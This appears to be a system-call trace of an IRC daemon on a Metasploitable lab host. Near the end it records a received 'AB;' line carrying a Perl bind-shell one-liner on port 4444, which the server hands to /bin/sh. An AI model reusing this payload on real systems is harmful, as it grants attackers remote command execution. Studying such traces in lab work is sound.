4519  20:00:41.991921 select(1024, [2 3 4 7 9], [], NULL, {0, 470000}) = 1 (in [7], left {0, 170000})
4519  20:00:42.289176 clock_gettime(CLOCK_MONOTONIC, {47252, 106197016}) = 0
4519  20:00:42.289198 recv(7, "PRIVMSG  #testit1 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  20:00:42.289228 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289246 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289261 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289276 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289289 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289303 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289316 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289329 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289342 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289356 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289369 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289382 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289395 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289408 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289421 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289434 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289447 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289461 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289474 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289488 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289501 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289527 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.289575 gettimeofday({1495670442, 289579}, NULL) = 0
4519  20:00:42.289587 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  20:00:42.289662 clock_gettime(CLOCK_MONOTONIC, {47252, 106674878}) = 0
4519  20:00:42.289674 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  20:00:42.289692 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  20:00:42.289707 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  20:00:42.289723 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  20:00:42.289753 close(5)          = 0
4519  20:00:42.289769 time(NULL)        = 1495670442
4519  20:00:42.289778 time(NULL)        = 1495670442
4519  20:00:42.289790 gettimeofday({1495670442, 289793}, NULL) = 0
4519  20:00:42.289801 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:00:42.289828 clock_gettime(CLOCK_MONOTONIC, {47252, 106841102}) = 0
4519  20:00:42.289838 gettimeofday({1495670442, 289842}, NULL) = 0
4519  20:00:42.289849 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 980000})
4519  20:00:42.309223 clock_gettime(CLOCK_MONOTONIC, {47252, 126243193}) = 0
4519  20:00:42.309244 recv(4, "PRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  20:00:42.309267 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309284 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309298 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309313 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309336 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309350 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309363 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309377 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309390 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309404 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309418 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309431 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309445 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309458 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309471 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309485 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309498 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309512 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309526 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309594 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309609 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309640 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.309670 gettimeofday({1495670442, 309674}, NULL) = 0
4519  20:00:42.309682 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 700000})
4519  20:00:42.608461 clock_gettime(CLOCK_MONOTONIC, {47252, 425470483}) = 0
4519  20:00:42.608462 recv(7, "PRIVMSG  #testit1 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  20:00:42.608484 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608502 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608516 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608530 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608544 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608558 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608571 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608584 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608597 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608611 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608624 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608637 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608650 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608663 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608676 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608690 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608703 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608716 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608729 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608750 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608763 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608777 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.608805 time(NULL)        = 1495670442
4519  20:00:42.608843 time(NULL)        = 1495670442
4519  20:00:42.608854 gettimeofday({1495670442, 608874}, NULL) = 0
4519  20:00:42.608882 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:00:42.608911 clock_gettime(CLOCK_MONOTONIC, {47252, 425923893}) = 0
4519  20:00:42.608921 gettimeofday({1495670442, 608925}, NULL) = 0
4519  20:00:42.608932 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 690000})
4519  20:00:42.918617 clock_gettime(CLOCK_MONOTONIC, {47252, 735625762}) = 0
4519  20:00:42.918617 recv(4, "PRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  20:00:42.918617 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918617 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918618 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918633 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918646 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918661 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918675 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918688 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918702 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918716 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918729 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918743 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918757 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918770 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918784 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918798 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918811 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918825 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918839 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918864 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918905 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918936 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:42.918953 gettimeofday({1495670442, 918957}, NULL) = 0
4519  20:00:42.918965 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 840000})
4519  20:00:43.081761 clock_gettime(CLOCK_MONOTONIC, {47252, 898783114}) = 0
4519  20:00:43.081784 time(NULL)        = 1495670443
4519  20:00:43.081796 time(NULL)        = 1495670443
4519  20:00:43.081810 gettimeofday({1495670443, 81814}, NULL) = 0
4519  20:00:43.081822 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  20:00:43.081863 clock_gettime(CLOCK_MONOTONIC, {47252, 898876269}) = 0
4519  20:00:43.081874 gettimeofday({1495670443, 81878}, NULL) = 0
4519  20:00:43.081885 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  20:00:43.081925 clock_gettime(CLOCK_MONOTONIC, {47252, 898938401}) = 0
4519  20:00:43.081937 accept(2, 0, NULL) = 5
4519  20:00:43.082009 getpeername(5, {sa_family=AF_INET, sin_port=htons(41977), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  20:00:43.082049 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:00:43.082107 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:00:43.082123 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  20:00:43.082136 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  20:00:43.082148 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  20:00:43.082174 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  20:00:43.082186 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  20:00:43.082204 clock_gettime(CLOCK_MONOTONIC, {47252, 899218169}) = 0
4519  20:00:43.082217 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  20:00:43.082230 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:00:43.082240 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:00:43.082250 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  20:00:43.082261 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  20:00:43.082276 send(6, "\257j\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  20:00:43.082328 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  20:00:43.082347 gettimeofday({1495670443, 82351}, NULL) = 0
4519  20:00:43.082359 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 980000})
4519  20:00:43.099200 clock_gettime(CLOCK_MONOTONIC, {47252, 916220767}) = 0
4519  20:00:43.099222 recvfrom(6, "\257j\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0~\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  20:00:43.099265 close(6)          = 0
4519  20:00:43.099282 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  20:00:43.099297 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  20:00:43.099365 time(NULL)        = 1495670443
4519  20:00:43.099376 time(NULL)        = 1495670443
4519  20:00:43.099388 gettimeofday({1495670443, 99392}, NULL) = 0
4519  20:00:43.099401 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:00:43.099430 clock_gettime(CLOCK_MONOTONIC, {47252, 916442747}) = 0
4519  20:00:43.099440 gettimeofday({1495670443, 99444}, NULL) = 0
4519  20:00:43.099451 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 960000})
4519  20:00:43.138492 clock_gettime(CLOCK_MONOTONIC, {47252, 955512160}) = 0
4519  20:00:43.138513 recv(7, "PRIVMSG  #testit1 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  20:00:43.138537 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138555 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138569 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138584 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138598 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138612 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138626 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138640 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138653 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138667 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138681 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138694 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138708 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138729 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138742 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138756 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138770 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138783 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138797 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138812 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138825 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138839 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 100000}, ...}) = 0
4519  20:00:43.138856 gettimeofday({1495670443, 138860}, NULL) = 0
4519  20:00:43.138868 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  20:00:43.138920 clock_gettime(CLOCK_MONOTONIC, {47252, 955933863}) = 0
4519  20:00:43.138933 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  20:00:43.138961 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  20:00:43.138980 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  20:00:43.138992 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  20:00:43.139009 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 9849
9849  20:00:43.139087 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
9849  20:00:43.139101 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
9849  20:00:43.139112 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9849  20:00:43.139126 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
9849  20:00:43.139246 brk(0)            = 0x80f9000
9849  20:00:43.139269 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9849  20:00:43.139286 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f6e000
9849  20:00:43.139304 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
9849  20:00:43.139321 open("/etc/ld.so.cache", O_RDONLY) = 1
9849  20:00:43.139335 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9849  20:00:43.139354 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f66000
9849  20:00:43.139364 close(1)          = 0
9849  20:00:43.139375 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9849  20:00:43.139389 open("/lib/libncurses.so.5", O_RDONLY) = 1
9849  20:00:43.139389 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
9849  20:00:43.139389 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
9849  20:00:43.139389 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f36000
9849  20:00:43.139390 mmap2(0xb7f63000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f63000
9849  20:00:43.139390 close(1)          = 0
9849  20:00:43.139390 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9849  20:00:43.139390 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
9849  20:00:43.139393 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
9849  20:00:43.139485 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
9849  20:00:43.139502 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f32000
9849  20:00:43.139514 mmap2(0xb7f34000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f34000
9849  20:00:43.139530 close(1)          = 0
9849  20:00:43.139542 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9849  20:00:43.139556 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
